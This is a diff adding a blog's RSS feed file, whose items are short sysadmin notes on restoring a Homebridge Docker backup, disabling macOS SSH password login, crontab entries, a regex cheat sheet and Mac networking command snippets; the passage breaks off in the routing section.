@@ -1,0 +1,1679 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Matt Hammond | Professional Pilot | CEH | Sec&#43; | Splunk | Homelab</title>
+    <link>http://localhost:1313/</link>
+    <description>Recent content on Matt Hammond | Professional Pilot | CEH | Sec&#43; | Splunk | Homelab</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 24 Nov 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Homebridge Restore Backup</title>
+      <link>http://localhost:1313/homebridge-restore-backup/</link>
+      <pubDate>Fri, 24 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/homebridge-restore-backup/</guid>
+      <description>&lt;h2 id=&#34;issue&#34;&gt;Issue&lt;/h2&gt;
+&lt;p&gt;When updating homebridge in docker with the onzu build, sometimes you may not be able to restore from your backup. I was able to restore via the command line; however, I had to manually reinstall my plugins. The good news is once you install the plugins via the Web UI, you do not have to reconfigure.&lt;/p&gt;
+&lt;h2 id=&#34;fix&#34;&gt;Fix&lt;/h2&gt;
+&lt;p&gt;Extract your &lt;strong&gt;homebridge-backup.tar.gz&lt;/strong&gt; into a folder. Navigate to &lt;code&gt;/var/lib/docker/volumes/homebridge_homebridge/_data&lt;/code&gt; (you may have to switch to root - &lt;code&gt;sudo su&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;/var/lib/docker/volumes/homebridge_homebridge/\_data&lt;/code&gt; delete:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;accessories&lt;/li&gt;
+&lt;li&gt;auth.json&lt;/li&gt;
+&lt;li&gt;backups&lt;/li&gt;
+&lt;li&gt;config.json&lt;/li&gt;
+&lt;li&gt;persist&lt;/li&gt;
+&lt;li&gt;plugin-persist&lt;/li&gt;
+&lt;li&gt;.uix-dashboard.json&lt;/li&gt;
+&lt;li&gt;.uix-secrets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Then copy everything from the storage folder within the extracted &lt;strong&gt;homebridge-backup.tar.gz&lt;/strong&gt; (ensure you also copy &lt;strong&gt;.uix-dashboard.json&lt;/strong&gt; &amp;amp; &lt;strong&gt;.uix-secrets&lt;/strong&gt;) to the &lt;code&gt;/var/lib/docker/volumes/homebridge_homebridge/\_data&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;You then need to change the ownership of these files &lt;code&gt;chown root:root accessories auth.json backups config.json persist plugin-persist .uix-dashboard.json .uix-secrets&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Once this is all complete, restart your container and navigate to &lt;code&gt;localhost:8581&lt;/code&gt;. In the Web UI go to plugins and find and install all the plugins you had. When the plugin installs, just close it, the configuration is already done from copying all your files earlier. For good measure, restart homebridge via the Web UI.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Disable MacOS SSH Password Login</title>
+      <link>http://localhost:1313/disable-macos-ssh-password-login/</link>
+      <pubDate>Mon, 16 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/disable-macos-ssh-password-login/</guid>
+      <description>&lt;p&gt;Create &lt;code&gt;000-hostname.conf&lt;/code&gt; in &lt;code&gt;/etc/ssh/sshd_config.d&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;000-hostnameconf&#34;&gt;000-hostname.conf&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UsePAM no
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PasswordAuthentication no
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;restart-ssh&#34;&gt;Restart SSH&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo launchctl stop com.openssh.sshd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo launchctl start com.openssh.sshd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Crontab</title>
+      <link>http://localhost:1313/crontab/</link>
+      <pubDate>Thu, 12 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/crontab/</guid>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# ┌───────────── minute (0 - 59)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ ┌───────────── hour (0 - 23)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ ┌───────────── day of month (1 - 31)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ │ ┌───────────── month (1 - 12)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ │ │ ┌───────────── day of week (0 - 6) (Sunday to Saturday;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ │ │ │                                   7 is also Sunday on some systems)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ │ │ │
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# │ │ │ │ │
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# * * * * *  command_to_execute https://crontab.guru
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# Sync AUG map files to backup dir
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0 20 * * * rsync -av --exclude={&amp;#34;.DS_Store&amp;#34;,&amp;#34;.git*&amp;#34;,&amp;#34;Icon?&amp;#34;} ~/Documents/Maps/AUG/ ~/Documents/Maps/AUG\ Backup/ 1&amp;gt;${HOME}/logs/cron.log
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# Send email when system reboots
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@reboot ${HOME}/.dotfiles/scripts/rebootemailcli.zsh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# Update domain ip
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/30 * * * * /bin/bash ${HOME}/.dotfiles/scripts/cloudflare.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Regex</title>
+      <link>http://localhost:1313/regex/</link>
+      <pubDate>Thu, 12 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/regex/</guid>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.       - Any Character Except New Line
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\d      - Digit (0-9)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\D      - Not a Digit (0-9)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\w      - Word Character (a-z, A-Z, 0-9, _)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\W      - Not a Word Character
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\s      - Whitespace (space, tab, newline)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\S      - Not Whitespace (space, tab, newline)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\b      - Word Boundary
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\B      - Not a Word Boundary
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;^       - Beginning of a String
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$       - End of a String
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[]      - Matches Characters in brackets
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[^ ]    - Matches Characters NOT in brackets
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       - Either Or
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;( )     - Group
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Quantifiers:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*       - 0 or More
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+       - 1 or More
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?       - 0 or One
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{3}     - Exact Number
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{3,4}   - Range of Numbers (Minimum, Maximum)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#### Sample Regexs ####
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Mac Network Cli Snippets</title>
+      <link>http://localhost:1313/mac-network-cli-snippets/</link>
+      <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/mac-network-cli-snippets/</guid>
+      <description>&lt;h2 id=&#34;ipconfig&#34;&gt;ipconfig&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;ip address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig getifaddr en0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;subnet mask&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig getoption en0 subnet_mask
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;dns server&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig getoption en0 domain_name_server
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;info about how en0 got its dhcp on&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig getpacket en0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;renew dhcp lease&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig set en0 DHCP
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# or this
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig set en1 BOOTP &amp;amp;&amp;amp; ipconfig set en1 DHCP
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig en1 down &amp;amp;&amp;amp; ifconfig en1 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;set a specific ip address&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig set en0 INFORM 192.168.1.160
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ifconfig&#34;&gt;ifconfig&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;network info&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig en0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;set &lt;code&gt;ip address&lt;/code&gt; and &lt;code&gt;netmask&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig en0 inet 192.168.1.154 netmask 255.255.255.0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;renew &lt;code&gt;dhcp leases&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig set en0 BOOTP &amp;amp;&amp;amp; ipconfig set en0 DHCP
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig en0 down &amp;amp;&amp;amp; ifconfig en0 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;networksetup&#34;&gt;networksetup&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;get a list of &lt;code&gt;location&lt;/code&gt; on the computer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networksetup -listlocations
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;active location&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networksetup -getcurrentlocation
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;config manual &lt;code&gt;static ip address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networksetup -setmanual Wi-Fi 192.168.1.154 255.255.255.0 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;config &lt;code&gt;dns server&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networksetup -setdnsservers Wi-Fi 192.168.1.154 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;get &lt;code&gt;dns server&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networksetup -getdnsservers Wi-Fi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;firewall&#34;&gt;firewall&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;stop the application layer firewall&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;launchctl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Library&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LaunchAgents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;apple&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;useragent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plist&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;launchctl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Library&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LaunchAgents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;apple&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plist&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;start the application layer firewall&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;launchctl&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;load&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Library&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LaunchAgents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;apple&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plist&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;launchctl&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;load&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Library&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LaunchAgents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;apple&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;useragent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plist&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;allow an app to communicate outside through the application layer firewall&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socketfilterfw -t &amp;#34;/Applications/...&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;route&#34;&gt;route&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;routing table&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -nr
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;add a route&lt;/li&gt;
+&lt;/ul&gt;
